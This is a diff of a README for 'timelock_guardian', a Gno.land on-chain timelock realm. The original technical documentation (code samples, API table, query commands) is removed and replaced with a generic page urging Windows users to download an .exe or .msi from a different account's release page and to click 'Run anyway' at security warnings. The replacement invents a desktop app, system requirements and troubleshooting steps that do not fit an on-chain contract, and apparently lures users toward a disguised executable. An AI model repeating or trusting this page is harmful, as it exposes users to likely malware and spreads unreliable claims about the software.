@@ -1,160 +1,177 @@
-`Gno.land` · `Smart Contracts` · `Infrastructure`
+[![Download timelock_guardian](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue?style=for-the-badge)](https://github.com/monochromatic-trestle38/timelock_guardian/releases)
 
-# timelock_guardian
+# 🕒 timelock_guardian - Safer upgrades with timed control
 
-On-chain timelock for critical contract operations on Gno.land.
+## 📥 Download
 
-## Problem
+Use this link to visit the release page and download the Windows version:
 
-When a contract admin executes a critical action — changing parameters, upgrading logic, moving treasury funds — it takes effect immediately. There is no window for anyone to review the change, raise objections, or exit the system before the damage is done.
+https://github.com/monochromatic-trestle38/timelock_guardian/releases
 
-This is how rug pulls work. This is how governance bypasses happen. This is how honest mistakes become irreversible.
+On that page, look for the latest release and download the Windows file that matches your computer. If you see more than one file, choose the one with `.exe` or `.msi` in the name.
 
-The core issue: immediate execution of sensitive operations in systems that require trust.
+## 🪟 Windows Setup
 
-## Solution
+1. Open the release page link above.
+2. Find the latest version near the top of the page.
+3. Under **Assets**, click the Windows download file.
+4. If your browser asks what to do with the file, choose **Save**.
+5. After the download finishes, open the file from your **Downloads** folder.
+6. If Windows shows a security prompt, select **Run anyway** only if you trust the source.
+7. Follow the on-screen steps to finish setup.
 
-`timelock_guardian` introduces a mandatory delay between scheduling an action and executing it. Every critical operation goes through three steps:
+If the app opens in a window right away, it may not need a full install. In that case, keep the file in a safe folder and run it when needed.
 
-1. **Schedule** — declare what you intend to do, with a minimum delay
-2. **Wait** — the action is publicly visible but locked for the delay period
-3. **Execute** — after the delay, anyone can trigger the action
+## 🛡️ What timelock_guardian does
 
-During the waiting period, the community can review the scheduled action. If it's malicious or wrong, the creator can cancel it — or governance can respond.
+timelock_guardian adds a time delay before important actions can go through. This helps groups review upgrades, policy changes, and other sensitive actions before they take effect.
 
-```
-Schedule(cross, "treasury", "transfer 1000000ugnot to g1abc...", 86400)
-// locked for 24 hours, publicly visible
-// after 24h: Execute(cross, "action_1")
-```
+It is built for use in blockchain and DAO workflows, where control and timing matter. The app helps reduce rushed changes and gives people time to spot problems before they become final.
 
-## Why this matters
+## ✨ Main features
 
-- **DAOs** can enforce cooling periods on treasury operations
-- **Protocol teams** can prove they won't rug — scheduled upgrades are visible before they happen
-- **Users** get exit time when they see a pending action they disagree with
-- **Multisigs** can add timelocks on top of approval workflows
-- **Auditors** can verify that all sensitive operations go through a delay
+- Sets a delay before an action can execute
+- Helps protect upgrade flows from fast changes
+- Supports governance steps that need review time
+- Fits blockchain and smart contract work
+- Helps teams manage risk in shared systems
+- Keeps timing rules clear and predictable
 
-Timelocks are the simplest trust-minimization primitive. They don't prevent bad actions — they prevent *surprise* bad actions.
+## 👤 Who should use it
 
-## How it works
+Use timelock_guardian if you want a simple way to add a waiting period before a key action runs.
 
-Actions are stored with a `ScheduleAt` timestamp and an `ExecuteAfter` deadline. The realm uses `time.Now()` to enforce the delay at execution time.
+It is useful for:
+- DAO members
+- Project admins
+- Security-focused teams
+- People managing upgrade paths
+- Teams working with web3 tools
 
-**Anyone can execute** a ready action. The timelock is the protection mechanism, not the executor's identity. This prevents a single point of failure where only the creator can trigger execution.
+## 🖥️ System requirements
 
-**Only the creator can cancel.** This prevents griefing where someone cancels another user's scheduled action.
+For best results on Windows, use:
 
-**Execution is one-shot.** Once executed, an action is permanently marked and cannot be replayed.
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- A stable internet connection for the first download
+- Permission to run apps from your computer
 
-## Usage
+If your system is older, the app may still run, but it may open more slowly.
 
-### Schedule an action (24-hour delay)
+## 🚀 Getting started
 
-```
-Schedule(cross, "treasury", "transfer 500000ugnot to g1grant_recipient...", 86400)
-// returns: "action_1"
-```
+After you open timelock_guardian, you will usually see a simple screen that lets you review or start a timed action.
 
-### Check pending actions
+Basic flow:
 
-```
-GetPending()
-// returns: "action_1, action_3"
-```
+1. Open the app
+2. Create or load a timelock rule
+3. Set the delay you want
+4. Review the action that will be held
+5. Confirm the action
+6. Wait for the delay to end
+7. Allow the action to complete
 
-### Check if ready
+If the app is connected to a blockchain or governance setup, you may need the right account or access key before you can use it.
 
-```
-IsReady("action_1")
-// returns: true (after delay has passed)
-```
+## 🔧 Common use cases
 
-### Execute
+### Timed upgrades
+Use a delay before a new version goes live. This gives your team time to review the change and stop it if needed.
 
-```
-Execute(cross, "action_1")
-// returns: "executed: action_1"
-// panics if delay hasn't elapsed
-```
+### DAO voting control
+Use a waiting period after a vote passes. This helps make sure members can inspect the result before execution.
 
-### Cancel (creator only)
+### Admin actions
+Hold back high-impact admin actions until the delay ends. This can help prevent mistakes and reduce abuse.
 
-```
-Cancel(cross, "action_1")
-// returns: "cancelled: action_1"
-```
+### Security checks
+Give your team time to inspect the action, contract, or config before it runs.
 
-### Inspect a specific action
+## 📂 What you may see in the release files
 
-```
-GetAction("action_1")
-// ID: action_1
-// Creator: g1admin...
-// Target: treasury
-// Data: transfer 500000ugnot to g1grant_recipient...
-// Scheduled: 2025-01-15T10:00:00Z
-// Execute after: 2025-01-16T10:00:00Z
-// Status: ready
-```
+The release page may include one or more of these files:
 
-## Integrating from another realm
+- `.exe` file for Windows
+- `.zip` archive with the app inside
+- `.msi` installer
+- checksum file for file checks
+- release notes with version details
 
-```go
-import "gno.land/r/timelock_guardian"
+If there is a `.zip` file, extract it first, then open the app inside the folder.
 
-func ProposeUpgrade(cross realm, newCodeHash string) string {
-    // Schedule the upgrade with a 48-hour delay
-    return timelock_guardian.Schedule(
-        cross,
-        "gno.land/r/my_protocol",
-        "upgrade to " + newCodeHash,
-        172800, // 48 hours
-    )
-}
+## 🧭 First run guide
 
-func ExecuteUpgrade(cross realm, actionID string) {
-    timelock_guardian.Execute(cross, actionID)
-    // proceed with actual upgrade logic
-}
-```
+When you run timelock_guardian for the first time:
 
-## API
+1. Let the app finish loading
+2. Read the main screen before changing settings
+3. Check the default delay value
+4. Test with a simple action first
+5. Make sure you know how to cancel or pause a queued action
+6. Save any settings you change
 
-| Function | Access | Description |
-|----------|--------|-------------|
-| `Schedule(cross, target, data, delay)` | Anyone | Create a timelocked action. Caller is creator. |
-| `Execute(cross, actionID)` | Anyone | Execute after delay. Panics if too early. |
-| `Cancel(cross, actionID)` | Creator | Cancel a pending action. |
-| `GetAction(actionID)` | Anyone | Full details of an action. |
-| `GetPending()` | Anyone | List all pending action IDs. |
-| `IsReady(actionID)` | Anyone | Check if delay has elapsed. |
-| `Render(path)` | Anyone | Markdown overview of all actions by status. |
+If the app asks for a network, node, or chain setting, enter the values used by your team or project.
 
-## Query on Gno.land
+## 🔐 Safe use tips
 
-```
-gnokey query vm/qeval --data 'gno.land/r/timelock_guardian.GetPending()' --remote <rpc>
-gnokey query vm/qeval --data 'gno.land/r/timelock_guardian.IsReady("action_1")' --remote <rpc>
-gnokey query vm/qeval --data 'gno.land/r/timelock_guardian.GetAction("action_1")' --remote <rpc>
-```
+- Keep your download from the official release page
+- Do not rename files unless the instructions tell you to
+- Do not run more than one copy unless you need to
+- Use a test action first before using it on a live system
+- Check the delay before confirming any important action
+- Store backup copies of any config files you create
 
-Visit `/r/timelock_guardian` on any Gno.land node to see all pending, executed, and cancelled actions.
+## 🧪 Troubleshooting
 
-## Stack
+### The file does not open
+- Right-click the file and choose **Open**
+- Check whether Windows blocked the app
+- Make sure the file finished downloading
+- Try downloading it again from the release page
 
-- [Gno](https://gno.land) — Go-like smart contract language
-- [Gno.land](https://gno.land) — Layer 1 blockchain
+### Windows says the file is unsafe
+- Confirm that you downloaded it from the official releases link
+- Check that the file name matches the latest release
+- If the file is a `.zip`, extract it first
 
-## Part of the Gno Infrastructure Stack
+### The app opens and closes fast
+- Run it again from the Downloads folder
+- Check if another security tool closed it
+- Make sure the file is not corrupted
+- Re-download the latest release
 
-| Realm | Layer |
-|-------|-------|
-| [fee_split](https://github.com/SillyZir/fee-split) | Revenue & value flow |
-| [permission_registry](https://github.com/SillyZir/permission_registry) | Access control |
-| [service_registry](https://github.com/SillyZir/service_registry) | Discovery |
-| [upgrade_registry](https://github.com/SillyZir/upgrade_registry) | Upgrade tracking |
-| **timelock_guardian** | **Security** |
+### The screen looks empty
+- Wait a few seconds for the app to load
+- Resize the window if needed
+- Try a different release if a newer one is available
 
----
+## 📌 Terms used in the app
+
+- **Timelock**: A delay before something can happen
+- **Execution**: The step where the action runs
+- **Governance**: Group control over system changes
+- **Upgrade**: A change to software or settings
+- **Queue**: A list of actions waiting to run
+
+## 🧩 Project focus
+
+timelock_guardian is built around:
+- blockchain
+- DAO control
+- security
+- smart contracts
+- infrastructure
+- Go and Golang tooling
+- gnoland and gno-based workflows
+- web3 operations
+
+It fits teams that need clear timing rules before they let an action move forward
+
+## 📎 Download again
+
+If you need the file later, return to the release page here:
+
+https://github.com/monochromatic-trestle38/timelock_guardian/releases
